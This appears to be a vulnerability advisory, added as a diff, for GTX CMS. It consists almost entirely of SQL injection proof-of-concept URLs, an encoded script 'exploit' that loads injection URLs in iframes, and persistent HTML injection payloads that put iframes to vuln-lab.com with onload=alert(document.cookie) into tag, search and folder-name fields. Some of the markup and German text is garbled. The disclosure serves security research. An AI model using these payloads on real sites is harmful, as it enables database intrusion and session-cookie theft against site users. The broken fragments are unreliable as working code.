@@ -1,0 +1,97 @@
+SQL-injection:
+
+PoC:
+http://www.example.com/Ajax/tagSearchTag?q=[TAG(x)]&modId=ptd&objId=37_%20'null[SQL INJECTION VULNErABILITY!]--
+http://www.example.com/Ajax/tagSearchTag?q=[TAG(x)]&modId=ptd%20'null[SQL INJECTION VULNErABILITY!]--&objId=3
+
+
+Exploit:
+<script type=``text/javascript``>document.write(unescape(``<script type=\``text\/javascript\
+``>document.write\(unescape\(\``%3Chtml%3E%0A%3Chead%3E%3Cbody%3E%0A%3Ctitle%3EGTX%20CMS%20-
+%20SQL%20INJECTION%20EXPLOIT%3C/title%3E%0A%3Ciframe%20src%3Dhttp%3A//gtx.localhost
+%3A8080/Ajax/tagSearchTag%3Fq%3D%5BTAG%28x%29%5D%26modId%3Dptd%26objId%3D37_%2520%27null
+%5BSQL%20INJECTION%20VULNErABILITY%21%5D--%20width%3D%22800%22%20height%3D%22800%22%3E%0A%3C
+iframe%20src%3Dhttp%3A//gtx.localhost%3A8080/Ajax/tagSearchTag%3Fq%3D%5BTAG%28x%29%5D%26modId
+%3Dptd%2520%27null%5BSQL%20INJECTION%20VULNErABILITY%21%5D--%20width%3D%22800%22%20height%3D
+%22800%22%3E%26objId%3Dx%0A%3C/body%3E%3C/head%3E%0A%3C/html%3E%0A%0A\``\)\);<\/script>``));</script>
+
+
+
+HTML-injection:
+
+
+PoC: Tags in Article or News
+<div class=``right``>
+<div id=``tagTagsWidget``>
+<ul class=``as-selections`` id=``as-selections-049``><li class=``as-selection-item blur`` 
+id=``as-selection-002``><a class=``as-close``>×/a>>``<iframe src=``GTX-CMS.de%20%20Mitglieder-
+Communities%20f%C3%BCr%20Golfclubs,%20Tennisclubs,%20Vereine,%20Verb%C3%A4nde%20etc.%20-%20auch%20als%20Intranet-CMS%20bestens%20
+geeignet%20%C2%BB%20Linkverzeichnis%20%C2%BB%20Link%20hinzuf%C3%BCgen_files/a.htm``></iframe></li><li 
+class=``as-original`` 
+id=``as-original-049``><input autocomplete=``off`` name=``tags`` id=``as-input-049`` class=``text as-input`` 
+type=``text``>
+<input value=``>``<iframe src=a> >``<iframe src=a>>``<iframe src=a> >``<iframe src=a>>``
+<iframe src=a> >``<iframe src=a>>``<iframe src=a> >``<iframe src=a>>``<iframe src=a> >``<iframe src=a>,>``
+<iframe src=http://vuln-lab.com>,`` class=``as-values`` name=``as_values_049`` id=``as-values-049`` 
+type=``hidden``></li></ul>
+<div style=``display: none;`` class=``as-results`` id=``as-results-049``></div>
+</div>
+
+
+Inject: Tags
+http://www.example.com/linkverzeichnis/hinzufuegen
+
+PoC (PATH):
+http://www.example.com/Ajax/tagSearchTag?q=%3E%22%3Ciframe%20src%3Da%3E%20%3E%22%3Ciframe%20src%3Da%3E&modId=ptd&objId=null
+http://www.example.com/Ajax/tagSearchTag?q=%3E%22%3Ciframe%20src%3Da%3E%20%3E%22%3Ciframe%20src%3Da%3E%20&modId=ptd&objId=null
+http://www.example.com/Ajax/tagSearchTag?q=%3E%22%3Ciframe%20src%3Dhttp%3Avuln-lab.com%3E&modId=ptd&objId=null
+
+
+
+1.2.2
+
+PoC: Suchbegriff(e) &  Entfernung von
+
+<div class=``box``>
+<div class=``formItems``>
+<div class=``item row1``>
+<div class=``left``>
+Schlüör</div><div class=``right``>>``<iframe 
+src=``GTX-CMS.de%20%20Mitglieder-Communities%20f%C3%BCr%20Golfclubs,
+%20Tennisclubs,%20Vereine,%20Verb%C3%A4nde%20etc.%20-%20auch%20als%20Intranet-CMS%20bestens%20geeignet%20%C2%BB%20Suche%20%C2%BB%20
+Linkverzeichnis%20%C2%BB%20Ergebnisse2_files/a.htm`` onload=``alert(document.cookie)`` <=```` div=````>
+</div>
+</div>
+</div>
+
+
+Inject: Suchbegriff(e) &  Entfernung von
+http://www.example.com/linkverzeichnis/hinzufuegen
+
+Output: 
+Suche - Linkverzeichnis  > Schlüör
+http://www.example.com/suche/linkverzeichnis
+
+
+
+
+1.2.3
+
+PoC: Ordnerverwaltung - Ordner Name
+
+<li class=``seperator``></li>
+<!-- Users folders -->
+<li><a class=``icon`` href=``/pers-nachrichten/ordner/iframe-srchttpvuln-labcom-onloadalertdocumentcookie-
+iframe-srchttpvuln-labcom-onloadalertdocumentcookie-_1``>
+<img src=``images/icons/Sophistique/files_24.png`` alt=``Ordner``>
+<span>>``<iframe src=``http://vuln-lab.com`` onload=``alert(document.cookie)`` <=``
+%20%20.``>``<iframe src=http://vuln-lab.com onload=alert(document.cookie) < (0)</span>
+</a></li>
+
+
+Inject: OrderVerwaltung Add
+http://www.example.com/pers-nachrichten/ordnerverwaltung
+
+Output: Persöche Nachrichten
+http://www.example.com/pers-nachrichten
+http://www.example.com/pers-nachrichten/ordnerverwaltung
